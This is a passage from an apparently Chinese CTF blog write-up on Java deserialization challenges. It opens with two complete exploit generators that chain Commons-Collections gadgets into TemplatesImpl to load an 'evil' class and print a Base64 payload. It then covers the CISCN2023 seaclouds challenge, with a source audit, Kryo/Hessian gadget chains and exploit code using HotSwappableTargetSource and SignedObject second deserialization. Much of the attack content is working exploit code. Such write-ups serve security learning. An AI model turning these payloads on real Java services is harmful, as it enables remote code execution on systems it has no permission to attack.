class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC6_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        entries.put(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> entries;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;k&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        innerMap.clear();<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iConstant&quot;</span>, myexpect);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        output.writeObject(expMap);<br>        output.flush();<br>        baos.flush();<br><br>        <span class="hljs-type">byte</span>[] data = baos.toByteArray();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> URLEncoder.encode(Base64.getEncoder().encodeToString(data));<br>        System.out.println(bugstr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC5+CC3-EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC5_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(entries, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(bad,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bad);<br>        oos.close();<br><br>        <span class="hljs-type">byte</span>[] byteArray = baos.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br>        System.out.println(encodedString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GET传参：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813010828414.png" alt="image-20240813010828414"></p><h2 id="CISCN2023-西南-seaclouds"><a href="#CISCN2023-西南-seaclouds" class="headerlink" title="[CISCN2023 西南]seaclouds"></a>[CISCN2023 西南]seaclouds</h2><p>这道题非常具有代表性，打的是Kryo反序列化和Hessian原生JDK的POC。</p><p>刚把Kryo和Hessian学了就再来重温一下这道题目。</p><p>审计一下源码：</p><p>MessageController.java:</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151127498.png" alt="image-20240816151127498"></p><p>访问根路由传参message，</p><p>那么它会解码一个硬编码的Base64字符串。如果<code>message</code>参数不为null，那么它会尝试解码该参数。如果解码失败，它会解码另一个硬编码的Base64字符串。</p><p>解码后的字节数组被传递给<code>CodecMessageConverter</code>的<code>toMessage</code>方法，该方法将字节数组转换为<code>Message</code>对象。然后，该方法返回<code>Message</code>对象的有效负载。</p><p>User.java：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151153559.png" alt="image-20240816151153559"></p><p>定义了一些setter和getter方法，</p><p>依赖有Kryo：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151355223.png" alt="image-20240816151355223"></p><p>那入手点就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders)<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> messagecode.getPayload();<br></code></pre></td></tr></table></figure><p>跟进toMessage方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151643378.png" alt="image-20240816151643378"></p><p>关键在decode，跟进<code>AbstractKryoCodec#decode</code>方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155453265.png" alt="image-20240816155453265"></p><p>再跟进到<code>PojoCodec#deDecode</code>方法：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155525741.png" alt="image-20240816155525741"></p><p>找到你了，<code>Kryo.readObject()</code>。</p><p>回到前面的<code>CodecMessageConverter</code>，这里指定了解码的类型<code>this.messageClass</code>（<code>GenericMessage</code>），</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152122326.png" alt="image-20240816152122326"></p><p>最后<code>MessageCodec#decode</code>也返回了一个<code>Message</code>对象，所以后面构造的时候要用<code>GenericMessage</code>将payload封装起来，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br><span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br></code></pre></td></tr></table></figure><p>跟进<code>GenericMessage</code>：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152901266.png" alt="image-20240816152901266"></p><p>看到了前面最后返回的getPayload()，也可以说明我们反序列化得到的结果是个GenericMessage对象。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152513832.png" alt="image-20240816152513832"></p><p>几个老熟人了，基本上看到这些就能想到对应链子。</p><p>在<a href="https://so.csdn.net/so/search?q=Spring%E4%BE%9D%E8%B5%96&spm=1001.2101.3001.7020">Spring依赖</a>下，可以触发<code>jackson</code>的<code>BaseJsonNode#toString</code>，从而调用getter，而后为所欲为，至于如何调用<code>toString</code>，对于原生反序列化，走<code>BadAttributeValueExpException</code>最为方便，对于Field型的非原生反序列化，如果对于Map的反序列化过程有类似<code>HashMap#put</code>的实现，就可以考虑<code>HotSwappableTargetSource</code>利用链，这也是Kryo非原生反序列化链子的重要部分。</p><p>但是直接用Kryo链子套肯定不行，因为网上Kryo相关的攻击都是在Dubbo下利用的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">com.esotericsoftware.kryo#readClassAndObject -&gt;<br>    com.esotericsoftware.kryo.serializers#read -&gt;<br>        java.util.HashMap#put -&gt;<br>            org.springframework.aop.target.HotSwappableTargetSource#equals -&gt;<br>                com.sun.org.apache.xpath.internal.objects.XString -&gt;<br>                    com.alibaba.fastjson.JSON#toString -&gt; fastjson gadget <br>                            -&gt; TemplatesImpl to load evil class<br></code></pre></td></tr></table></figure><p>用的是从<code>HotSwappableTargetSource</code>套一层然后触发到<code>fastjson#toString</code>的gadget。</p><p>但fastjson是Dubbo自带的，本题没有这个依赖，也就是要找后半段链子来接上<code>toString</code>。</p><p>根据题目提示用Hessian原生JDK去打（Hessian在那条链只充当<code>source</code>触发toString），这里用到的就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList<br></code></pre></td></tr></table></figure><p>整体链子是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.activation.MimeTypeParameterList#toString<br>UIDefaults#get<br>UIDefaults#getFromHashTable<br>UIDefaults$LazyValue#createValue<br>SwingLazyValue#createValue<br>sun.reflect.misc.MethodUtil#invoke<br></code></pre></td></tr></table></figure><p>具体的Hessian分析就免了，可以看：<a href="https://p4d0rn.gitbook.io/java/serial-journey/hessian_only_jdk#mimetypeparameterlist--methodutil">Hessian_Only_JDK | Java (gitbook.io)</a></p><p>我们对<code>decode</code>方法进行调试，发现它会进到<code>kryo.readObject()</code>中，也就是说这里可以触发<code>kryo</code>反序列化的打法，<code>kryo</code>和<code>Hessian</code>是一类的，都是基于<code>Field</code>机制，会进入到<code>hashMap.put</code>中，因此可以用<code>Hessian</code>的链子来打。</p><p>首先本地尝试下kryo的<code>templatesImpl</code>链子吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>    hashMap#put() -&gt;<br>    HotSwappableTargetSource#equals() -&gt;<br>    Xstring#equals() -&gt;<br>    BaseJsonNode#toString() -&gt;<br>    templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getTemplates()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(hotSwappableTargetSource, <span class="hljs-string">&quot;1&quot;</span>);<br>        hashMap.put(hotSwappableTargetSource1, <span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(hotSwappableTargetSource, <span class="hljs-string">&quot;target&quot;</span>, pojoNode);<br>        setFieldValue(hotSwappableTargetSource1, <span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>        <span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br>        <span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) <span class="hljs-literal">null</span>);<br>        messagecode.getPayload();<br>    &#125;<br></code></pre></td></tr></table></figure><p>不出意外的报错了：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816161919403.png" alt="image-20240816161919403"></p><p>报了<code>Null</code>指针异常，下个断点看看，虽然弹出calc了，但是实质上没有利用成功。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816162348967.png" alt="image-20240816162348967"></p><p>因为调试进入后，你会发现即使给<code>_factory</code>赋值了，最终还是会变成<code>null</code>从而触发异常，因为<code>_tfactory</code>是<code>transient</code>修饰的，不能参与序列化和反序列化。而且前面也说过Kryo和Hessian类似，也有这个特点。</p><p>那么可以用二次反序列化，这样就无关<code>_tfactory</code>了。<a href="https://eddiemurphy89.github.io/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">二次反序列化 - EddieMurphy’s blog (eddiemurphy89.github.io)</a></p><p>Gadget呼之欲出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">kyro#readObject() -&gt;<br>hashMap#put() -&gt;<br>HotSwappableTargetSource#equals() -&gt;<br>Xstring#equals() -&gt;<br>BaseJsonNode#toString() -&gt;<br>SignedObject#getObject() -&gt;<br>HashMap#readObject() -&gt;<br>templatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>注意重写<code>com.fasterxml.jackson.databind.node.BaseJsonNode</code>，移除其<code>writeReplace()</code>方法，让Exp里的优先调用我们重写的方法，以顺利进行对象序列化，注意一下文件结构：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816170942916.png" alt="image-20240816170942916"></p><p>测试一下，本地通了：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171350935.png" alt="image-20240816171350935"></p><p>补充下，这里用Hessian那些什么Spring AOP也是空指针异常，打不动。</p><h3 id="开缝"><a href="#开缝" class="headerlink" title="开缝"></a>开缝</h3><p>整体调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">CodecMessageConverter<br>    -&gt; toMessage(decodemsg, ...)<br>       <span class="hljs-built_in">this</span>.codec.decode(decodemsg, ...)<br><br>AbstractKryoCodec<br>    -&gt; decode(decodemsg, ...)<br><br>PojoCodec<br>    -&gt; doDecode(...)<br><br>Kryo<br>    -&gt; 